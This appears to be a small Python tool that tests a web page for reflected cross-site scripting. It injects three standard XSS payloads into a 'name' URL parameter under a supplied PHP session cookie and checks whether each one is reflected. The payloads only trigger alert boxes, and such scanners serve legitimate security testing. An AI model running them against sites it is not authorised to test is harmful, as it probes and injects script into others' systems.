import requests
from urllib.parse import quote_plus
import sys

# List of XSS payloads to test
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
]

def url_construct(base_url, payload):
    # Encode the payload for safe inclusion in the URL
    enc_payload = quote_plus(payload, safe='')
    # Construct the full URL with the encoded payload
    url = base_url + "?" + "name=" + enc_payload + "#"
    return url

def test_reflected_xss(session, url, payload, cookies):
    # Construct the full URL with the payload
    full_url = url_construct(url, payload)
    # Send a GET request with the constructed URL and cookies
    response = session.get(full_url, cookies=cookies)
    
    # Check if the payload is reflected in the response
    if payload in response.text:
        print(f"Reflected XSS found with payload: {payload}")
    else:
        print(f"No reflected XSS found with payload: {payload}")

def main():
    # Get the base URL and session ID from command line arguments
    base_url = sys.argv[1]
    cookies = {
        "PHPSESSID": sys.argv[2],
    }
    # Create a session object
    session = requests.Session()

    # Test each XSS payload
    for payload in xss_payloads:
        test_reflected_xss(session, base_url, payload, cookies)

if __name__ == "__main__":
    # Run the main function if the script is executed directly
    main()
    exit(0)  # Exit the program with success code 0
